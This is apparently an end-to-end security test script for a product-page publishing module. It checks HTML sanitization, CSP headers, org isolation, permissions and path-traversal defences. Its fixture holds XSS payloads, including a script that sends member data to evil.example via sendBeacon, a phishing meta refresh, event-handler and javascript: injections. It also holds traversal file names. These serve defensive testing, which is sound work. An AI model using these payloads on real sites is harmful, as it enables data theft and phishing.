/**
 * 产品详情页模块端到端验收脚本：
 * 1. 启动内存版 PGlite → 2. prisma migrate deploy → 3. 启动应用（PRODUCT_PAGES_DIR 指向临时目录）
 * 4. 断言：HTML 净化（script/事件属性/iframe/meta refresh/base/javascript: 全剥除）、
 *    公开响应头（CSP script-src 'none' + sandbox + nosniff）、本站 base 注入与 assets 闭环、
 *    pageId 不可从商品 id 推导、跨组织覆盖被拒、重下载覆盖同页、列表按组织过滤、
 *    无 erp.source.view 时货盘源链被裁剪、鉴权与权限门禁、路径穿越防护、HTML 超长拒绝
 * 运行：pnpm verify:product-pages
 */
import { PGlite } from '@electric-sql/pglite'
import { PGLiteSocketServer } from '@electric-sql/pglite-socket'
import { execFile } from 'node:child_process'
import { promisify } from 'node:util'

// 注意：必须用异步 execFile——同步 exec 会冻结事件循环，导致同进程的 PGlite socket 无法响应
const execFileAsync = promisify(execFile)
import { mkdtempSync, rmSync } from 'node:fs'
import fsp from 'node:fs/promises'
import { tmpdir } from 'node:os'
import path from 'node:path'
import { fileURLToPath } from 'node:url'

const serverDir = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..')
// 5441：避开 dev-db(5433) 与 compliance(5435)/ebay(5436)/collection(5437)/import(5438)/erp-p4(5439)/media(5440)
const dbPort = 5441
const pagesDir = mkdtempSync(path.join(tmpdir(), 'verify-product-pages-'))

// connection_limit 封顶 Prisma 连接池，避免 Promise.all 突发查询超出 PGlite socket 上限被销毁（P1001）
process.env.DATABASE_URL = `postgresql://postgres:postgres@127.0.0.1:${dbPort}/postgres?sslmode=disable&connection_limit=20`
process.env.JWT_SECRET = 'verify-product-pages-secret'
process.env.ACCESS_TOKEN_TTL = '1h'
process.env.LOG_LEVEL = 'warn'
process.env.PRODUCT_PAGES_DIR = pagesDir

// ---------- 基础设施 ----------
console.log('[verify] 启动嵌入式 PostgreSQL…')
const db = new PGlite()
const socket = new PGLiteSocketServer({ db, port: dbPort, host: '127.0.0.1', maxConnections: 50 })
await socket.start()

async function waitForPgReady(port: number, attempts = 30): Promise<void> {
  const net = await import('node:net')
  for (let i = 0; i < attempts; i += 1) {
    const ok = await new Promise<boolean>(resolve => {
      const sock = net.connect(port, '127.0.0.1')
      const done = (result: boolean) => { sock.destroy(); resolve(result) }
      sock.on('connect', () => {
        const params = Buffer.from('user\0postgres\0database\0postgres\0\0')
        const msg = Buffer.alloc(8 + params.length)
        msg.writeInt32BE(8 + params.length, 0)
        msg.writeInt32BE(196608, 4)
        params.copy(msg, 8)
        sock.write(msg)
      })
      sock.on('data', () => done(true))
      sock.on('error', () => done(false))
      setTimeout(() => done(false), 1000)
    })
    if (ok) return
    await new Promise(resolve => setTimeout(resolve, 500))
  }
  throw new Error('PGlite 就绪等待超时')
}
await waitForPgReady(dbPort)

console.log('[verify] 执行数据库迁移…')
const prismaBin = path.join(serverDir, 'node_modules', '.bin', 'prisma')
const { stdout, stderr } = await execFileAsync(prismaBin, ['migrate', 'deploy'], { cwd: serverDir, env: { ...process.env } })
if (stdout.trim()) console.log(stdout.trim())
if (stderr.trim()) console.error(stderr.trim())

console.log('[verify] 启动应用…')
const { buildApp } = await import('../src/app.js')
const { prisma } = await import('../src/lib/prisma.js')
const { hashPassword } = await import('../src/lib/password.js')
const { PRESET_ROLES } = await import('../src/modules/rbac/permissions.js')
const app = await buildApp()
await app.listen({ port: 0, host: '127.0.0.1' })
const address = app.server.address()
const base = `http://127.0.0.1:${typeof address === 'object' && address ? address.port : 0}`

// ---------- 测试工具 ----------
let passed = 0
let failed = 0
function check(name: string, condition: boolean, extra?: unknown) {
  if (condition) {
    passed += 1
    console.log(`  ✔ ${name}`)
  } else {
    failed += 1
    console.error(`  ✘ ${name}`, extra === undefined ? '' : JSON.stringify(extra))
  }
}

interface ApiResult { status: number; data: any }

async function api(method: string, pathName: string, body?: unknown, token?: string): Promise<ApiResult> {
  const response = await fetch(base + pathName, {
    method,
    headers: {
      ...(body === undefined ? {} : { 'content-type': 'application/json' }),
      ...(token ? { authorization: `Bearer ${token}` } : {})
    },
    body: body === undefined ? undefined : JSON.stringify(body)
  })
  let data: any = null
  try { data = await response.json() } catch { /* 无响应体 */ }
  return { status: response.status, data }
}

/** 读公开页原始响应（文本 + 响应头），公开端点无需 token */
async function rawPage(pathName: string): Promise<{ status: number; text: string; headers: Headers }> {
  const response = await fetch(base + pathName)
  return { status: response.status, text: await response.text(), headers: response.headers }
}

/** 直接建第二个组织 + OWNER（register 端点只会把新用户挂到首个组织并置 PENDING，无法造出独立组织） */
async function createOrgOwner(orgName: string, phone: string, name: string): Promise<{ orgId: string; userId: string; token: string }> {
  const org = await prisma.organization.create({ data: { name: orgName } })
  for (const preset of PRESET_ROLES) {
    await prisma.role.create({
      data: {
        orgId: org.id,
        key: preset.key,
        name: preset.name,
        isSystem: true,
        permissions: { create: preset.permissions.map(code => ({ code })) }
      }
    })
  }
  const ownerRole = await prisma.role.findFirstOrThrow({ where: { orgId: org.id, key: 'OWNER' } })
  const user = await prisma.user.create({
    data: {
      orgId: org.id,
      email: phone,
      name,
      passwordHash: await hashPassword('pass1234'),
      isOwner: true,
      roles: { create: [{ roleId: ownerRole.id }] }
    }
  })
  return { orgId: org.id, userId: user.id, token: app.jwt.sign({ sub: user.id, org: org.id }, { expiresIn: '1h' }) }
}

/** 建一个只持有指定权限码的非 OWNER 成员（用于验证字段裁剪与权限门禁） */
async function createMember(orgId: string, phone: string, name: string, roleKey: string, codes: string[]): Promise<{ userId: string; token: string }> {
  const role = await prisma.role.create({
    data: { orgId, key: roleKey, name: roleKey, isSystem: false, permissions: { create: codes.map(code => ({ code })) } }
  })
  const user = await prisma.user.create({
    data: { orgId, email: phone, name, passwordHash: await hashPassword('pass1234'), roles: { create: [{ roleId: role.id }] } }
  })
  return { userId: user.id, token: app.jwt.sign({ sub: user.id, org: orgId }, { expiresIn: '1h' }) }
}

const PNG_BYTES = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, ...Buffer.from('verify-product-page-image', 'utf8')])

/** 模拟第三方源页：混杂正常商品内容与各类可执行载荷 */
const MALICIOUS_HTML = [
  '<!DOCTYPE html><html><head>',
  '<title>纯棉 T 恤</title>',
  '<base href="https://evil.example/">',
  '<link rel="stylesheet" href="https://evil.example/a.css">',
  '<meta http-equiv="refresh" content="0;url=https://evil.example/phish">',
  '<style>.price{color:#f40}</style>',
  '<script>window.__pwned=1;fetch("/api/members").then(r=>r.json()).then(d=>navigator.sendBeacon("https://evil.example/x",JSON.stringify(d)))</script>',
  '</head><body>',
  '<h1 class="title" style="font-size:18px">纯棉 T 恤</h1>',
  '<img src="assets/01.png" alt="主图" onerror="alert(1)">',
  '<div onclick="steal()">详情</div>',
  '<iframe src="https://evil.example/frame"></iframe>',
  '<svg><script>alert(2)</script><foreignObject><div>x</div></foreignObject></svg>',
  '<form action="https://evil.example/steal"><input name="pwd"><button>提交</button></form>',
  '<a href="javascript:alert(3)">点我</a>',
  '<a href="https://detail.1688.com/offer/123.html" target="_blank">源页</a>',
  '<table><tbody><tr><td>材质</td><td>棉</td></tr></tbody></table>',
  '</body></html>'
].join('')

function submitPayload(overrides: Record<string, unknown> = {}) {
  return {
    warehouseProductId: 'wh-verify-1',
    warehouseCode: 'WH001',
    sourceUrl: 'https://detail.1688.com/offer/123.html',
    finalUrl: 'https://detail.1688.com/offer/123.html?spm=1',
    title: '纯棉 T 恤',
    price: '¥19.90',
    specs: [{ key: '材质', value: '棉' }],
    descriptionText: '透气不起球',
    html: MALICIOUS_HTML,
    images: [{ name: '01.png', contentType: 'image/png', dataBase64: PNG_BYTES.toString('base64') }],
    ...overrides
  }
}

// ---------- 验收场景 ----------
try {
  console.log('\n[0] 准备账号：组织A（OWNER + 两个受限成员）与组织B（独立 OWNER）')
  const registerA = await api('POST', '/api/auth/register', { name: '老板A', email: '13900000001', password: 'pass1234' })
  const tokenA: string = registerA.data?.tokens?.accessToken ?? ''
  const orgAId: string = registerA.data?.user?.org?.id ?? ''
  check('注册组织A OWNER → 200', registerA.status === 200 && Boolean(tokenA) && Boolean(orgAId), registerA.data)

  const orgB = await createOrgOwner('验收组织B', '13900000002', '老板B')
  check('直接建组织B OWNER 成功', Boolean(orgB.token) && orgB.orgId !== orgAId, orgB)

  // 有 product.edit 但无 erp.source.view：验证货盘源链被裁剪
  const editor = await createMember(orgAId, '13900000003', '编辑员', 'VERIFY_EDITOR', ['product.edit'])
  // 无 product.edit：验证提交门禁
  const viewer = await createMember(orgAId, '13900000004', '只读员', 'VERIFY_VIEWER', ['dashboard.view'])
  check('受限成员创建成功', Boolean(editor.token) && Boolean(viewer.token))

  console.log('\n[1] 未鉴权与权限门禁')
  const noAuthList = await api('GET', '/api/product-pages')
  const noAuthPost = await api('POST', '/api/product-pages', submitPayload())
  const forbiddenPost = await api('POST', '/api/product-pages', submitPayload(), viewer.token)
  check('未登录 GET 列表 → 401', noAuthList.status === 401, noAuthList.status)
  check('未登录 POST 提交 → 401', noAuthPost.status === 401, noAuthPost.status)
  check('无 product.edit 成员 POST → 403', forbiddenPost.status === 403, forbiddenPost.status)

  console.log('\n[2] 提交产品页：pageId 随机化 + 落盘净化')
  const create = await api('POST', '/api/product-pages', submitPayload(), editor.token)
  const pageId: string = create.data?.pageId ?? ''
  check('提交 → 200 且返回 pageId 与 url', create.status === 200 && Boolean(pageId) && create.data?.url === `/product-pages/${pageId}`, create.data)
  check('pageId 不由 warehouseProductId 推导（防枚举）', pageId !== 'wh-verify-1' && !pageId.includes('wh-verify-1'), pageId)

  const legacyGuess = await rawPage('/product-pages/wh-verify-1')
  check('用旧确定性 id 猜测公开页 → 404', legacyGuess.status === 404, legacyGuess.status)

  const storedHtml = await fsp.readFile(path.join(pagesDir, pageId, 'index.html'), 'utf8')
  check('落盘 HTML 不含 <script', !/<script/i.test(storedHtml))
  check('落盘 HTML 不含脚本内容字面量', !storedHtml.includes('__pwned') && !storedHtml.includes('sendBeacon'))
  check('落盘 HTML 不含内联事件属性', !/\son(error|click)\s*=/i.test(storedHtml))
  check('落盘 HTML 不含 iframe / svg / form / input', !/<(iframe|svg|form|input|object|embed)\b/i.test(storedHtml))
  check('落盘 HTML 不含 meta refresh 与源页 base/link', !/<(meta|base|link)\b/i.test(storedHtml) && !storedHtml.includes('evil.example'))
  check('落盘 HTML 不含 javascript: 协议', !/javascript:/i.test(storedHtml))
  check('保留正常内容：标题/内联 style/style 块/表格/本地图片', storedHtml.includes('纯棉 T 恤')
    && storedHtml.includes('.price{color:#f40')
    && storedHtml.includes('style="font-size:18px"')
    && storedHtml.includes('<img src="assets/01.png"')
    && storedHtml.includes('<td>材质</td>'))
  check('外链保留但去掉 target 并补 rel', storedHtml.includes('href="https://detail.1688.com/offer/123.html"')
    && !storedHtml.includes('target=')
    && storedHtml.includes('rel="nofollow noopener noreferrer"'))

  console.log('\n[3] 公开详情页：安全响应头 + 本站 base 注入 + 无需登录可读')
  const page = await rawPage(`/product-pages/${pageId}`)
  const csp = page.headers.get('content-security-policy') ?? ''
  check('公开页无需登录 → 200', page.status === 200, page.status)
  check('CSP 含 script-src \'none\'（决定性控制）', csp.includes("script-src 'none'"), csp)
  check('CSP 含 sandbox 且不含 allow-same-origin', csp.split(';').map(part => part.trim()).includes('sandbox') && !csp.includes('allow-same-origin'), csp)
  check('CSP base-uri 限定 self（本站 base 可用、外部 base 被拒）', csp.includes("base-uri 'self'"), csp)
  check('CSP 含 frame-ancestors/form-action none', csp.includes("frame-ancestors 'none'") && csp.includes("form-action 'none'"), csp)
  check('CSP 含 media-src self（重托管视频可播放，且仅本站）', csp.includes("media-src 'self'") && !/media-src[^;]*https:/i.test(csp), csp)
  check('响应头含 nosniff / no-referrer / noindex', page.headers.get('x-content-type-options') === 'nosniff'
    && page.headers.get('referrer-policy') === 'no-referrer'
    && (page.headers.get('x-robots-tag') ?? '').includes('noindex'))
  check('content-type 为 text/html', (page.headers.get('content-type') ?? '').startsWith('text/html'))
  check('cache-control 为 no-cache（重下载覆盖后立即可见，不吃旧缓存）', page.headers.get('cache-control') === 'no-cache', page.headers.get('cache-control'))
  check('注入本站 base 指向本页目录', page.text.includes(`<base href="/product-pages/${pageId}/">`), page.text.slice(0, 200))
  check('补全文档外壳避免 quirks mode（DOCTYPE + charset + meta 标题）',
    page.text.startsWith('<!DOCTYPE html>') && page.text.includes('<meta charset="utf-8">') && page.text.includes('<title>纯棉 T 恤</title>'),
    page.text.slice(0, 200))
  check('响应体不含任何可执行载荷', !/<script/i.test(page.text) && !/\son(error|click)\s*=/i.test(page.text) && !page.text.includes('evil.example'))

  const trailing = await rawPage(`/product-pages/${pageId}/`)
  check('尾斜杠路由同样带 CSP', trailing.status === 200 && (trailing.headers.get('content-security-policy') ?? '').includes("script-src 'none'"), trailing.status)

  console.log('\n[4] 静态资源闭环与穿越防护')
  const asset = await fetch(`${base}/product-pages/${pageId}/assets/01.png`)
  const assetBytes = Buffer.from(await asset.arrayBuffer())
  check('assets 图片 → 200 + image/png + 内容一致', asset.status === 200
    && (asset.headers.get('content-type') ?? '').startsWith('image/png')
    && assetBytes.equals(PNG_BYTES), { status: asset.status, ct: asset.headers.get('content-type') })
  check('assets 响应头含 nosniff（防内容嗅探）', asset.headers.get('x-content-type-options') === 'nosniff')

  const traversalAsset = await fetch(`${base}/product-pages/${pageId}/assets/..%2f..%2f..%2fmeta.json`)
  const traversalPage = await rawPage('/product-pages/..%2f..%2fetc')
  const badPageId = await rawPage('/product-pages/' + 'a'.repeat(121))
  check('assets 路径穿越 → 404', traversalAsset.status === 404, traversalAsset.status)
  check('pageId 含非法字符 → 400', traversalPage.status === 400, traversalPage.status)
  check('pageId 超长 → 被拒（400 校验失败或 414 URI 过长）', badPageId.status === 400 || badPageId.status === 414, badPageId.status)

  console.log('\n[5] 跨组织覆盖防护与重下载覆盖同页')
  const beforeCrossOrg = await fsp.readFile(path.join(pagesDir, pageId, 'index.html'), 'utf8')
  const crossOrg = await api('POST', '/api/product-pages', submitPayload({ pageId, html: '<div>组织B 篡改</div>', warehouseProductId: 'wh-verify-1' }), orgB.token)
  const afterCrossOrg = await fsp.readFile(path.join(pagesDir, pageId, 'index.html'), 'utf8')
  check('组织B 覆盖组织A 的 pageId → 403', crossOrg.status === 403 && crossOrg.data?.error === 'PAGE_ID_FORBIDDEN', crossOrg)
  check('被拒后原页面内容未被改写', beforeCrossOrg === afterCrossOrg)
  check('伪造不存在的 pageId 覆盖 → 403', (await api('POST', '/api/product-pages', submitPayload({ pageId: 'nonexistent-page-id' }), orgB.token)).status === 403)

  const overwrite = await api('POST', '/api/product-pages', submitPayload({ pageId, html: '<div>第二次下载</div><script>bad()</script>', title: '纯棉 T 恤 V2' }), editor.token)
  const overwrittenHtml = await fsp.readFile(path.join(pagesDir, pageId, 'index.html'), 'utf8')
  check('本组织带 pageId 重下载 → 200 且复用同一 pageId', overwrite.status === 200 && overwrite.data?.pageId === pageId, overwrite.data)
  check('覆盖后内容为新 HTML 且仍经净化', overwrittenHtml.includes('第二次下载') && !/<script/i.test(overwrittenHtml) && !overwrittenHtml.includes('bad()'))
  const overwrittenMeta = JSON.parse(await fsp.readFile(path.join(pagesDir, pageId, 'meta.json'), 'utf8')) as Record<string, unknown>
  check('覆盖后 meta.title 更新且 orgId 保留', overwrittenMeta.title === '纯棉 T 恤 V2' && overwrittenMeta.orgId === orgAId, overwrittenMeta)

  const fresh = await api('POST', '/api/product-pages', submitPayload({ warehouseProductId: 'wh-verify-2' }), editor.token)
  check('不带 pageId 的提交生成新的独立 pageId', fresh.status === 200 && fresh.data?.pageId !== pageId, fresh.data)

  console.log('\n[6] 列表按组织过滤 + 货盘源链字段裁剪')
  const listA = await api('GET', '/api/product-pages', undefined, tokenA)
  const itemsA = (listA.data?.items ?? []) as Array<Record<string, unknown>>
  check('组织A OWNER 列表 → 200 且含 2 条', listA.status === 200 && itemsA.length === 2, itemsA.length)
  check('OWNER 可见 sourceUrl（持 erp.source.view）', itemsA.every(item => typeof item.sourceUrl === 'string' && item.sourceUrl.length > 0), itemsA[0])

  const listEditor = await api('GET', '/api/product-pages', undefined, editor.token)
  const itemsEditor = (listEditor.data?.items ?? []) as Array<Record<string, unknown>>
  check('无 erp.source.view 成员列表条目已剥除 sourceUrl/finalUrl',
    itemsEditor.length === 2 && itemsEditor.every(item => !('sourceUrl' in item) && !('finalUrl' in item)),
    itemsEditor[0])

  const listB = await api('GET', '/api/product-pages', undefined, orgB.token)
  check('组织B 列表看不到组织A 的任何页面', listB.status === 200 && (listB.data?.items ?? []).length === 0, listB.data)

  console.log('\n[7] 输入上限与审计')
  const tooLong = await api('POST', '/api/product-pages', submitPayload({ html: `<div>${'x'.repeat(9 * 1024 * 1024)}</div>` }), editor.token)
  check('HTML 超过 8MB 上限 → 400 VALIDATION', tooLong.status === 400 && tooLong.data?.error === 'VALIDATION', { status: tooLong.status, error: tooLong.data?.error })
  const tooManyImages = await api('POST', '/api/product-pages', submitPayload({
    images: Array.from({ length: 61 }, (_unused, index) => ({ name: `${String(index + 1).padStart(2, '0')}.png`, contentType: 'image/png', dataBase64: PNG_BYTES.toString('base64') }))
  }), editor.token)
  check('图片数超过 60 上限 → 400 VALIDATION', tooManyImages.status === 400 && tooManyImages.data?.error === 'VALIDATION', { status: tooManyImages.status })
  const badImageName = await api('POST', '/api/product-pages', submitPayload({ images: [{ name: '../../evil.png', contentType: 'image/png', dataBase64: PNG_BYTES.toString('base64') }] }), editor.token)
  check('非法图片名（穿越尝试）→ 400 VALIDATION', badImageName.status === 400, badImageName.status)

  const audits = await prisma.auditLog.findMany({ where: { orgId: orgAId, action: 'product-page.publish' } })
  check('审计：product-page.publish 留痕（3 次成功提交）', audits.length === 3, audits.length)

  console.log('\n[8] 17 要素扩展字段：提交受理 + 公开页分区渲染 + meta 落盘')
  const rich = submitPayload({
    warehouseProductId: 'wh-verify-rich',
    title: 'Manaul Folding Scooter M2085',
    category: '首页 / 汽车配件与运输 / 电动代步车',
    itemCode: 'W2923P220458',
    firstStockAt: '2024-10-10',
    returnRate: '低',
    sellableInventory: '60',
    unitPrice: '$2300.00',
    packingFee: '$3.16',
    freightFee: '$17.47~$37.14',
    shippingFee: '$20.63~$40.30 /件',
    estimatedTotal: '$2343.05 /件',
    dropshipLeadTime: '1-3个工作日',
    gigaIndex: '64.10',
    materialPackUrl: 'assets/m-01.zip',
    materialPackDownloads: '352',
    fileAssets: [{ name: 'f-01.pdf', contentType: 'application/pdf', dataBase64: 'JVBERi0xLjQK' }],
    packAsset: { name: 'm-01.zip', contentType: 'application/zip', dataBase64: 'UEsDBBQAAAAA' },
    descriptionText: 'The M2085 Blue\nfoldable in 2 steps',
    descriptionImages: [{ name: 'd-01.png', contentType: 'image/png', dataBase64: PNG_BYTES.toString('base64') }],
    videos: [{ name: 'v-01.mp4', contentType: 'video/mp4', dataBase64: 'AAAA' }],
    files: [{ name: 'K240272 (2085_2091).pdf', url: 'assets/f-01.pdf', label: 'Medicare/HCPCS Code' }],
    features: ['【True Foldable, No Need to Disassemble】 The elderly motorized scooter can be folded in 2 steps.'],
    descriptionFlow: [
      { kind: 't', text: 'FLOW-BEFORE e2e' },
      { kind: 'tbl', rows: [['Bike Type', '20 Inch Electric Cargo Tricycle'], ['Rider Height', 'fits height 5\'2"-6\'5"']] },
      { kind: 'img', i: 0 },
      { kind: 't', text: 'FLOW-AFTER e2e paragraph long enough to stay a paragraph.' }
    ],
    specs: [{ key: '颜色', value: 'Blue' }, { key: '产品重量 (磅)', value: '52.03' }, { key: '长度 (英寸)', value: '40.75' }]
  })
  const richPost = await api('POST', '/api/product-pages', rich, tokenA)
  check('17 要素载荷提交 → 200', richPost.status === 200, richPost.data)
  const richPageId = String(richPost.data?.pageId ?? '')
  const richPage = await rawPage(`/product-pages/${richPageId}`)
  for (const token of ['首页 / 汽车配件与运输', 'W2923P220458', '2024-10-10', '低', '60', '$2300.00', '$3.16', '$17.47~$37.14', '$20.63~$40.30 /件', '$2343.05 /件', '1-3个工作日', '64.10', '下载素材包', '352', 'K240272 (2085_2091).pdf', 'Medicare/HCPCS Code', '图文描述', 'assets/d-01.png', 'assets/v-01.mp4', 'class="pp-badges"', 'class="pp-specs pp-fees"', '颜色', 'Blue', 'class="pp-spec-groups"', '>产品规格<', '>产品尺寸<', '>包装尺寸<', 'class="pp-desc pp-features"', '【True Foldable, No Need to Disassemble】']) {
    check(`公开页含要素：${token}`, richPage.text.includes(token))
  }
  const richMeta = JSON.parse(await fsp.readFile(path.join(pagesDir, richPageId, 'meta.json'), 'utf8')) as Record<string, unknown>
  check('meta 落盘扩展字段', richMeta.itemCode === 'W2923P220458' && richMeta.estimatedTotal === '$2343.05 /件' && Array.isArray(richMeta.files) && (richMeta.files as unknown[]).length === 1 && Array.isArray(richMeta.videos) && (richMeta.videos as unknown[]).length === 1)
  const videoAsset = await rawPage(`/product-pages/${richPageId}/assets/v-01.mp4`)
  check('视频资产 → 200 + video/mp4 + no-cache', videoAsset.status === 200 && (videoAsset.headers.get('content-type') ?? '') === 'video/mp4' && videoAsset.headers.get('cache-control') === 'no-cache', { status: videoAsset.status, ct: videoAsset.headers.get('content-type') })
  check('描述流文图穿插顺序（图在两段文字之间）', richPage.text.indexOf('FLOW-BEFORE e2e') < richPage.text.indexOf('assets/d-01.png') && richPage.text.indexOf('assets/d-01.png') < richPage.text.indexOf('FLOW-AFTER e2e'))
  check('描述流表格块渲染为原站边框表（两列键值灰底）', richPage.text.includes('<table class="pp-desc-table pp-desc-table--kv">') && richPage.text.includes('<td>Bike Type</td><td>20 Inch Electric Cargo Tricycle</td>') && richPage.text.includes('<td>fits height 5\'2&quot;-6\'5&quot;</td>'))
  check('描述流表格位于文档序（文字与图之间）', richPage.text.indexOf('FLOW-BEFORE e2e') < richPage.text.indexOf('<table class="pp-desc-table') && richPage.text.indexOf('<table class="pp-desc-table') < richPage.text.indexOf('assets/d-01.png'))
  const richFlow = Array.isArray(richMeta.descriptionFlow) ? (richMeta.descriptionFlow as Array<Record<string, unknown>>) : []
  const richTbl = richFlow.find(block => block.kind === 'tbl')
  check('meta 落盘表格块 rows', !!richTbl && JSON.stringify(richTbl.rows) === JSON.stringify([['Bike Type', '20 Inch Electric Cargo Tricycle'], ['Rider Height', 'fits height 5\'2"-6\'5"']]), richTbl)
  const fileAsset = await rawPage(`/product-pages/${richPageId}/assets/f-01.pdf`)
  check('文件资产 → 200 + application/pdf（免登录可下）', fileAsset.status === 200 && (fileAsset.headers.get('content-type') ?? '').startsWith('application/pdf'), fileAsset.headers.get('content-type'))
  const packAssetPage = await rawPage(`/product-pages/${richPageId}/assets/m-01.zip`)
  check('素材包资产 → 200 + application/zip', packAssetPage.status === 200 && (packAssetPage.headers.get('content-type') ?? '') === 'application/zip', packAssetPage.headers.get('content-type'))
  check('公开页文件/素材包为自托管 download 直链', richPage.text.includes('href="assets/f-01.pdf" download') && richPage.text.includes('href="assets/m-01.zip" download'))

  console.log('\n[9] 源站无链接场景降级：素材包无 URL / 文件仅文件名')
  const degraded = submitPayload({
    warehouseProductId: 'wh-verify-degraded',
    title: 'Manaul Folding Scooter M2085',
    materialPackUrl: '',
    materialPackDownloads: '352',
    files: [{ name: '2085 disassembly video.txt', url: '', label: '安装视频' }]
  })
  const degradedPost = await api('POST', '/api/product-pages', degraded, tokenA)
  check('降级载荷提交 → 200', degradedPost.status === 200, degradedPost.data)
  const degradedPageId = String(degradedPost.data?.pageId ?? '')
  const degradedPage = await rawPage(`/product-pages/${degradedPageId}`)
  check('素材包无链接 → 渲染次数 + 原站提示', degradedPage.text.includes('class="pp-material-note"') && degradedPage.text.includes('352') && degradedPage.text.includes('素材包需在原站登录后下载'))
  check('文件无链接 → 纯文件名 + 获取提示', degradedPage.text.includes('class="pp-file-plain">2085 disassembly video.txt') && degradedPage.text.includes('文件链接需在原站登录后获取'))
  check('文件无链接不产生空 href', !degradedPage.text.includes('<a href=""'))
  const degradedMeta = JSON.parse(await fsp.readFile(path.join(pagesDir, degradedPageId, 'meta.json'), 'utf8')) as Record<string, unknown>
  check('meta 保留空 url 与 label', JSON.stringify(degradedMeta.files) === JSON.stringify([{ name: '2085 disassembly video.txt', url: '', label: '安装视频' }]), degradedMeta.files)
  check('files.url 非 http(s) → 400 VALIDATION', (await api('POST', '/api/product-pages', submitPayload({ warehouseProductId: 'wh-verify-badfile', files: [{ name: 'a.pdf', url: 'javascript:alert(1)' }] }), tokenA)).status === 400)
} finally {
  await app.close()
  await socket.stop()
  await db.close()
  rmSync(pagesDir, { recursive: true, force: true })
}

console.log(`\n[verify] 通过 ${passed} 项，失败 ${failed} 项`)
if (failed > 0) process.exit(1)
